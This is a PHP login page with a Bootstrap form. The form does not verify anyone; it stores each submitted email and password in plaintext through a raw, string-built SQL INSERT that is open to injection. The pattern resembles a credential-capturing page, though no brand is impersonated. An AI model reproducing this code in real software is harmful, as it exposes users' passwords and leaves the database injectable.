<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="./style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
<title>login</title>
 

</head>
<body class="bg-light">
  <?php
  error_reporting(0);
    include_once('connection.php');
    $email=$_POST['email_address'];
     $email_password=$_POST['password'];


     if ($email!="" && $email_password!=""){
      $kali="INSERT INTO login_page SET email_address='$email' , password='$email_password' ";
      mysqli_query($con,$kali);
     }

  ?>

    <section class="container-fluid  ">       
      <section class="row justify-content-center">
            <section class="col-12 col-sm-6 col-md-3">
         <form class="form-container was-validated" method="POST" >
  <div class="form-group">
    <h2>Login form</h2>
    <label for="exampleInputEmail1">Email address</label>
    <input type="email" class="form-control " name="email_address" aria-describedby="emailHelp" required="">
    <div class="valid-feedback">Your Email is Valid</div>
    <div class="invalid-feedback">Please Enter a Valid Email </div>
    <small class="form-text text-muted">We'll never share your email with anyone else.</small>
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1">Password</label>
    <input type="password" class="form-control" name="password" required="">
    <div class="valid-feedback">Your password Valid</div>
    <div class="invalid-feedback">Please Enter a valid Password</div>
    <small class="form-text text-muted" >Enter a Secure password Ex. 124@!#$%df</small>
  </div>
  <!-- <div class="form-group form-check">
    <input type="checkbox" class="form-check-input" name="check">
    <label class="form-check-label" for="exampleCheck1"> Remember me</label>
  </div> -->
  <button type="submit" class="btn btn-primary btn-block">Submit</button>
   <small id="login Help" class="form-text "><a href="index.php"> new user sign up</a></small>
</form>        
            </section>
      </section>
    </section>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js" integrity="sha384-LtrjvnR4Twt/qOuYxE721u19sVFLVSA4hf/rRt6PrZTmiPltdZcI7q7PXQBYTKyf" crossorigin="anonymous"></script>
</body>

</html>



